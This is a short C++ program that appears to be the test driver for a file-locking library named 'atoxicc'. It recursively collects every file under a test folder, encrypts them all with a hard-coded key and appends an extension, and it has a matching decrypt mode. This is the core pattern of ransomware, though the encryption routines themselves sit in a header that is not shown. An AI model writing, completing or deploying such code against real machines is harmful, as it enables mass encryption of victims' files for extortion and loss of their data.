#include <Windows.h>
#include <iostream>
#include <string>
#include "atoxicc.h"

#define CRYPT
//#define DECRYPT

using namespace std; //for test

#define path "D:\\test_atoxicc\\*" //path

const byte key[] = { 0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF }; //test key

int main(int argc, char** argv)
{
	list<FILE_DATA> file;
	size_t timee;

#ifdef CRYPT
	file.deleteAll(); //Clearing file list
	timee = GetTickCount64(); // Sav time to calculate time
	ListPotentialFile(path, &file); //List all file recursively in path
	cout << "Time elapsed to find " << file.size() << " file(s) in " << (GetTickCount64() - timee) << "ms" << endl;
	timee = GetTickCount64(); // Sav time to calculate time
	AEncryptFileList(&file, (void*)key, sizeof(key)); //Encrypt all file in list and add extention
	cout << "Time elapsed to crypt " << file.size() << " file(s) in " << (GetTickCount64() - timee) << "ms" << endl;
#endif // CRYPT

#ifdef DECRYPT
	file.deleteAll(); //Clearing file list
	timee = GetTickCount64(); // Sav time to calculate time
	ListPotentialEncryptedFile(path, &file); //List all file recursively in path wich is encrypted
	cout << "Time elapsed to find " << file.size() << " file(s) in " << (GetTickCount64() - timee) << "ms" << endl;
	timee = GetTickCount64(); // Sav time to calculate time
	ADecryptFileList(&file, (void*)key, sizeof(key)); //Decrypt all file
	cout << "Time elapsed to decrypt " << file.size() << " file(s) in " << (GetTickCount64() - timee) << "ms" << endl;
#endif // DECRYPT

	cin.ignore().get(); //to pause before end
}